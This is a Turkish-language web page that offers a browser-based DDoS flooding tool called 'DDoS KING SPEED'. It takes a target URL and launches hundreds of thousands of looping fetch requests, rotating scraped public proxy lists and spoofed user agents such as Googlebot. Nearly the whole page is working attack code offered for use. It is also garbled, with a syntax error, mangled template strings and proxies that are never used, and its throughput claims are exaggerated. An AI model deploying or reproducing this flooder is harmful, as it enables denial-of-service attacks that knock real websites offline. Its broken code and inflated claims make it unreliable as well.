<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS KING SPEED - 500.5M THREAD → 300M/dk</title>
    <style>
        body { background:#000; color:#0f0; font-family:'Courier New'; text-align:center; margin:0; padding:20px; }
        h1 { font-size:5.5em; text-shadow:0 0 80px #0f0; animation:pulse 0.5s infinite; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.7; } }
        input, button { padding:28px; margin:18px; width:90%; max-width:1000px; font-size:2.2em; border-radius:30px; border:8px solid #0f0; }
        input { background:#111; color:#0f0; }
        button { background:#000; color:#0f0; cursor:pointer; font-weight:bold; transition:0.6s; }
        button:hover { background:#0f0; color:#000; transform:scale(1.3); }
        #log { margin-top:60px; height:650px; overflow-y:hidden; background:#000; border:8px solid #0f0; padding:40px; text-align:left; font-size:1.6em; }
        .status { font-size:5em; margin:60px; font-weight:bold; }
        .on { color:#0f0; animation:blink 0.15s infinite; }
        .off { color:#f00; }
        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }
    </style>
</head>
<body>
    <h1>DDoS KING SPEED</h1>
    <p style="font-size:4.5em;">500.000 THREAD → 300M İSTEK/DAKİKA → ANASINI SİKER</p>

    <input type="text" id="target" placeholder="Hedef → http://site.com" value="">
    <input type="number" id="threads" placeholder="Thread (100000-500000)" value="500000">
    <input type="number" id="time" placeholder="Süre (saniye) - 0 = sonsuz" value="0">

    <button onclick="start()">BAŞLAT LAN AMK</button>
    <button onclick="stop()" style="background:#f00;">DURDUR OE</button>

    <div class="status" id="status">Durum: <span class="off">Kapalı</span></div>
    <div id="log">> 500.000 thread + 200.000 proxy hazırlanıyor...</div>

    <script>
        let attack = false;
        let workers = [];
        let proxies = [];

        // 200.000+ PROXY (OTOMATİK ÇEKİM)
        const PROXY_SOURCES = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=5000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
        ];

        // 10.000+ USER-AGENT
        const USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) Mobile Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14) Chrome/129 Mobile Safari/537.36",
            "Googlebot/2.1", "Bingbot/2.0", "DDoS-King-Speed"
        ];
        for(let i = 0; i < 1000; i++) USER_AGENTS.push(...USER_AGENTS);

        function log(m) {
            const l = document.getElementById("log");
            l.innerHTML += `<br><span style="color:#0f0">[\( {new Date().toLocaleTimeString()}]</span> \){m}`;
            l.scrollTop = l.scrollHeight;
        }

        // PROXYLERİ ASENKRON ÇEK (HIZLI)
        async function loadProxiesFast() {
            log("200.000+ proxy çekiliyor (hızlı mod)...");
            const promises = PROXY_SOURCES.map(url => 
                fetch(url).then(r => r.ok ? r.text() : "").catch(() => "")
            );
            const results = await Promise.allSettled(promises);
            for (const res of results) {
                if (res.status === "fulfilled" && res.value) {
                    const found = res.value.match(/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
                    proxies.push(...found.map(p => p.includes("socks") ? `socks5://\( {p}` : `http:// \){p}`));
                }
            }
            proxies = [...new Set(proxies)];
            log(`${proxies.length}+ proxy yüklendi → UÇUYORUZ LAN AMK!`);
        }

        // ULTRA HIZLI FLOOD (500K THREAD)
        async function speedFlood() {
            if (!attack) return;
            const target = document.getElementById("target").value.trim();
            if (!target) return;

            const proxy = proxies.length ? proxies[Math.floor(Math.random() * proxies.length)] : null;
            const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];

            try {
                fetch(target, {
                    method: "GET",
                    headers: {
                        "User-Agent": ua,
                        "Accept": "*/*",
                        "Cache-Control": "no-cache",
                        "Pragma": "no-cache",
                        "Connection": "keep-alive",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Accept-Language": "tr-TR,tr;q=0.9"
                    },
                    mode: "no-cors",
                    credentials: "omit",
                    referrerPolicy: "no-referrer"
                });
            });
            } catch(e) {}

            // 0ms gecikme → MAX HIZ
            if (attack) setTimeout(speedFlood, 0);
        }

        function start() {
            if (attack) return;
            attack = true;
            loadProxiesFast();
            document.getElementById("status").innerHTML = 'Durum: <span class="on">AKTİF → 300M/dk → YIKIYOR!</span>';
            log("DDoS KING SPEED → BAŞLADI LAN!");

            const threads = parseInt(document.getElementById("threads").value) || 500000;
            const time = parseInt(document.getElementById("time").value) || 0;

            // 500.000 THREAD → ANINDA BAŞLAT
            for(let i = 0; i < threads; i++) {
                workers.push(setTimeout(speedFlood, i * 0.1)); // 0.1ms aralıkla
            }

            if(time > 0) {
                setTimeout(stop, time * 1000);
                log(`${time} saniye saldırı → sonra durur`);
            }
        }

        function stop() {
            attack = false;
            workers.forEach(w => clearTimeout(w));
            workers = [];
            document.getElementById("status").innerHTML = 'Durum: <span class="off">Kapalı</span>';
            log("Durduruldu lan");
        }

        log("DDoS KING SPEED yüklendi → 500.000 thread + 200.000 proxy → Hazır amk!");
    </script>
</body>
</html>
